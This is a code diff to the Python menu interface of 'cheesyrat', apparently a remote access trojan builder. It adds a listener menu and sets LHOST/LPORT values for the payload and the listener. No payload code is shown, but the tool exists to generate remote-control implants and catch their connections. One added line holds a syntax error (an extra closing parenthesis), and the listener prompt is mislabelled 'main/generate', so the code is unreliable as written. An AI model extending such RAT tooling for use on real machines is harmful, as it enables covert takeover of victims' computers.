@@ -18,51 +18,48 @@ def complete_menu():
     cheesyrat_lib.banner()
     answ=True
     while answ:
-        ans = ""
         menu_kw = ["help", "generate", "listen", "credits", "banner", "clear", "exit", "quit", "force quit"]
         completer = autocomplete.Complete(menu_kw)
         readline.set_completer(completer.complete)
         readline.parse_and_bind('tab: complete')
         ans = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'menu' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
-        if ans.lower() == "help":
-            cheesyrat_lib.main_menu_help()
-        elif ans == "?":
+        if ans.lower() == "help" or ans == "?":
             cheesyrat_lib.main_menu_help()
         elif ans.lower() == "generate":
             generate_menu()
         elif ans.lower() == "listen":
-            print("load listener")
+            listener_menu()
         elif ans.lower() == "credits":
             cheesyrat_lib.clear()
             cheesyrat_lib.credits()
             back = input(colors.GREEN + colors.BOLD + '\n\nPress [ENTER] to return to menu' + colors.END)
-            cheesyrat_lib.clear()
-            cheesyrat_lib.banner()
+            if back == "":
+                cheesyrat_lib.clear()
+                cheesyrat_lib.banner()
+            else:
+                cheesyrat_lib.clear()
+                cheesyrat_lib.banner()
         elif ans.lower() == "banner":
             cheesyrat_lib.banner()
         elif ans.lower() == "clear":
             cheesyrat_lib.clear()
-        elif ans.lower() == "exit":
-            cheesyrat_lib.exit_function()
-        elif ans.lower() == "quit":
+        elif ans.lower() == "exit" or ans.lower() == "quit":
             cheesyrat_lib.exit_function()
         elif ans.lower() == "force quit":
             cheesyrat_lib.force_quit()
         elif ans == "":
             pass
         else:
-            cheesyrat_lib.warning_message("Invalid command.")
+            cheesyrat_lib.warning_message("Invalid command. Type 'help' for help")
 
 def generate_menu():
     while True:
-        generate_kw = ["help", "clear", "back", "exit", "quit", "options", "info", "set", "run", "generate", "build", "run", "force quit"]
+        generate_kw = ["help", "clear", "back", "exit", "quit", "options", "info", "set", "run", "generate", "build", "force quit"]
         completer = autocomplete.Complete(generate_kw)
         readline.set_completer(completer.complete)
         readline.parse_and_bind('tab: complete')
         cmd = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'main/generate' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
-        if cmd.lower() == "help":
-            cheesyrat_lib.generate_menu_help()
-        elif cmd.lower() == "?":
+        if cmd.lower() == "help" or cmd == "?":
             cheesyrat_lib.generate_menu_help()
         elif cmd.lower() == "options" or cmd.lower() == "info":
             cheesyrat_lib.payload_options()
@@ -72,12 +69,12 @@ def generate_menu():
                 if socket.gethostbyname(lhost) == lhost:
                     try:
                         socket.inet_aton(lhost)
-                        cheesyrat_lib.update_json("lhost", lhost, cheesyrat_lib.get_config_json_file())
+                        cheesyrat_lib.update_json("lhost_payload", lhost, cheesyrat_lib.get_config_json_file())
                         print(" LHOST => " + lhost)
                     except socket.error:
-                        cheesyrat_lib.error_message("Invalid host address. The host is probably not up.", False)
+                        cheesyrat_lib.error_message("Invalid IP address. The IP is probably not up.", False))
                 else:
-                    cheesyrat_lib.update_json("lhost", lhost, cheesyrat_lib.get_config_json_file())
+                    cheesyrat_lib.update_json("lhost_payload", lhost, cheesyrat_lib.get_config_json_file())
                     print(" LHOST => " + lhost)
             except:
                 cheesyrat_lib.error_message("Invalid or misspelled host address.", False)
@@ -85,7 +82,7 @@ def generate_menu():
             try:
                 lport = int(cmd[10:])
                 if 1 <= lport <= 65535:
-                    cheesyrat_lib.update_json("lport", int(lport), cheesyrat_lib.get_config_json_file())
+                    cheesyrat_lib.update_json("lport_payload", int(lport), cheesyrat_lib.get_config_json_file())
                     print(" LPORT => " + str(lport))
                 elif not 1 <= lport <= 65535:
                     cheesyrat_lib.error_message(str(lport) + "is not a valid port number.", False)
@@ -97,16 +94,63 @@ def generate_menu():
             cheesyrat_lib.clear()
         elif cmd.lower() == "back":
             break
-        elif cmd.lower() == "exit":
-            cheesyrat_lib.exit_function()
-        elif cmd.lower() == "quit":
+        elif cmd.lower() == "exit" or cmd.lower() == "quit":
             cheesyrat_lib.exit_function()
         elif cmd.lower() == "force quit":
             cheesyrat_lib.force_quit()
         elif cmd == "":
             pass
         else:
-            cheesyrat_lib.warning_message("Invalid command.")
+            cheesyrat_lib.warning_message("Invalid command. Type 'help' for help.")
+
+def listener_menu():
+    while True:
+        generate_kw = ["help", "clear", "back", "exit", "quit", "options", "info", "set", "run", "force quit", "listen"]
+        completer = autocomplete.Complete(generate_kw)
+        readline.set_completer(completer.complete)
+        readline.parse_and_bind('tab: complete')
+        listener = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'main/generate' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
+        if listener.lower() == "help" or listener == "?":
+            cheesyrat_lib.listener_menu_help()
+        elif listener.lower() == "clear":
+            cheesyrat_lib.clear()
+        elif listener.lower() == "back":
+            break
+        elif listener.lower() == "options" or listener.lower() == "info":
+            cheesyrat_lib.listener_options()
+        elif listener.lower()[0:9] == "set lhost":
+            lhost = listener[10:]
+            try:
+                if socket.gethostbyname(lhost) == lhost:
+                    try:
+                        socket.inet_aton(lhost)
+                        cheesyrat_lib.update_json("lhost_listener", lhost, cheesyrat_lib.get_config_json_file())
+                        print(" LHOST => " + lhost)
+                    except socket.error:
+                        cheesyrat_lib.error_message("Invalid IP address. The IP is probably not up.", False)
+                else:
+                    cheesyrat_lib.update_json("lhost_listener", lhost, cheesyrat_lib.get_config_json_file())
+                    print(" LHOST => " + lhost)
+            except:
+                cheesyrat_lib.error_message("Invalid or misspelled host address.", False)
+        elif listener.lower()[0:9] == "set lport":
+            try:
+                lport = int(listener[10:])
+                if 1 <= lport <= 65535:
+                    cheesyrat_lib.update_json("lport_listener", int(lport), cheesyrat_lib.get_config_json_file())
+                    print(" LPORT => " + str(lport))
+                elif not 1 <= lport <= 65535:
+                    cheesyrat_lib.error_message(str(lport) + "is not a valid port number.", False)
+            except ValueError:
+                cheesyrat_lib.error_message("The port provided is invalid", False)
+        elif listener.lower() == "exit" or listener.lower() == "quit":
+            cheesyrat_lib.exit_function()
+        elif listener.lower() == "force quit":
+            cheesyrat_lib.force_quit()
+        elif listener.lower() == "":
+            pass
+        else:
+            cheesyrat_lib.warning_message("Invalid command. Type 'help' for help.")
 
 if __name__ == "__main__":
     cheesyrat_lib.check()
